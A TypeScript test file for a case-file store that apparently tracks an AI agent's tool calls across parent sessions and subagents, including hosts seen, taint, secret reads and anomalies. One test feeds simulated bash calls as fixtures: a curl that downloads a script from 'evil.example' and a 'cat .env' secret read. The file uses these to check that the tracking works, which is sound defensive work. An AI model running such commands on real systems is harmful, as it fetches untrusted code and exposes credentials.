import { describe, expect, test } from "bun:test";
import { describeCaseFileContract } from "../../../../tests/fixtures/context/casefile-contract.ts";
import { bashPost, bashPre } from "../../../../tests/fixtures/context/index.ts";
import { createCaseFile, InMemoryCaseFileStore, openCaseFile } from "./casefile.ts";

describeCaseFileContract("InMemoryCaseFileStore", (opts) => new InMemoryCaseFileStore(opts));

describe("InMemoryCaseFileStore", () => {
  test("root() returns the same case file for the same session", () => {
    const store = new InMemoryCaseFileStore();
    expect(store.root("sess_a")).toBe(store.root("sess_a"));
    expect(store.root("sess_a")).not.toBe(store.root("sess_b"));
  });

  test("a linked session keeps its first root and resolves when reopened without parent", () => {
    const store = new InMemoryCaseFileStore();
    expect(store.link("sess_c", "sess_p")).toBe("sess_p");
    expect(store.link("sess_c", "sess_other")).toBe("sess_p");
    expect(openCaseFile(store, "sess_c", null).sessionId).toBe("sess_c");
    expect(store.rootOf("sess_c")).toBe("sess_p");
  });

  test("a session named as its own parent stays a root", () => {
    const store = new InMemoryCaseFileStore();
    expect(openCaseFile(store, "sess_x", "sess_x").parentId).toBeNull();
  });

  test("a subagent's case file reads and writes its root's (spec: inherited by reference)", async () => {
    // Arrange
    const store = new InMemoryCaseFileStore({ now: () => 7_000 });
    const root = openCaseFile(store, "sess_root", null);
    const sub = openCaseFile(store, "sess_sub", "sess_root");

    // Act
    sub.setTaskOnce("Fix the flaky test in auth/");
    sub.recordPre(await bashPre("curl -o /tmp/x.sh https://evil.example/x", { callId: "call_s1" }));
    sub.recordPre(await bashPre("cat .env", { callId: "call_s2" }));
    sub.recordPost(await bashPost("cat .env", { ok: false, exitCode: 1 }, { callId: "call_s2" }));
    sub.recordPost(await bashPost("cat notes", { stdout: "see https://evil.example/y" }));
    sub.setBudget({ ...sub.budget, spent: 12 });

    // Assert
    expect({ id: sub.sessionId, parent: sub.parentId, now: sub.now() }).toEqual({
      id: "sess_sub",
      parent: "sess_root",
      now: 7_000,
    });
    expect(root.task).toBe("Fix the flaky test in auth/");
    expect(sub.task).toBe(root.task);
    expect(root.budget.spent).toBe(12);
    expect(sub.budget).toEqual(root.budget);
    expect([...sub.filesWritten().keys()]).toEqual(["/tmp/x.sh"]);
    expect(sub.hostsSeen()).toEqual(root.hostsSeen());
    expect([...sub.hostsFirstSeen().keys()]).toEqual(["evil.example"]);
    expect(sub.taintSet()).toEqual(root.taintSet());
    expect(sub.taintSet().some((t) => t.value.includes("evil.example"))).toBe(true);
    expect(root.secretReadsSince(0).map((r) => r.callId)).toEqual(["call_s2"]);
    expect(sub.secretReadsSince(0)).toEqual(root.secretReadsSince(0));
    expect(root.failuresInARow()).toBe(0);
    expect(sub.failuresInARow()).toBe(root.failuresInARow());
    expect(root.recentCalls(60_000).map((c) => c.callId)).toContain("call_s2");
    expect(sub.recentCalls(60_000)).toEqual(root.recentCalls(60_000));
    expect(sub.anomalies()).toEqual(root.anomalies());
  });

  test("createCaseFile builds a single root with the injected clock", () => {
    const cf = createCaseFile("sess_a", { now: () => 42 });
    expect(cf.now()).toBe(42);
    expect(cf.parentId).toBeNull();
  });
});
